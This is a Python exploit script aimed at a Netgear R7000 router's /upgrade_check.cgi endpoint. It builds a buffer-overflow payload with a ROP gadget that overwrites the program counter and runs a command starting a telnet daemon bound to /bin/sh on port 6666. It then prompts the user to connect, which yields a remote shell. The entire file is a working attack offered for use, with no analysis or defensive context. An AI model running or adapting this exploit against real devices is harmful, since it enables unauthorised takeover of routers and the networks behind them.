#!/usr/bin/env python3
import socket
import sys


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[!] Usage: python exploit_r7000.py 192.168.1.x\n")
        exit(1)
    else: 
        targetip = sys.argv[1]
        rop_gadget = "\xb4\xcf\x03\x00"
        commands = "/bin/utelnetd -p6666 -l/bin/sh -d"
        name = "mtenFWUpload"
        data = ""
        data += "*#$^" # magic number
        data += "\x00\x00\x04\x00" # size
        data += "A" * 0x60
        data += "B" * 0x4  # r4
        data += "C" * 0x4  # r5
        data += "D" * 0x4  # r6
        data += "E" * 0x4  # r7
        data += "F" * 0x4  # r8
        data += "G" * 0x4  # r9
        data += "H" * 0x4  # r10
        data += "I" * 0x4  # r11
        data += rop_gadget # pc
        data += commands+ "\x00" # Add the command and then NULL-terminate it
        data += "Z" * 0x1000 # Pad out the payload (it needs to be at least a certain size)

        # Send the payload
        payload = ''
        payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
        payload += 'Host: {}\r\n'.format(targetip)
        payload += 'Content-Disposition: AAAA\r\n'
        payload += 'Content-Length: {}\r\n'.format(len(data))
        payload += 'Content-Type: application/octet-stream\r\n'
        payload += 'name="{}"\r\n'.format(name)
        payload += '\r\n'
        payload += data
        print("[*] The attack payload has been sent to {}".format(targetip))
        print("[*] Now you can try to telnet {} 6666".format(targetip))


        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((targetip, 80))
        sock.send(payload)
        sock.close()
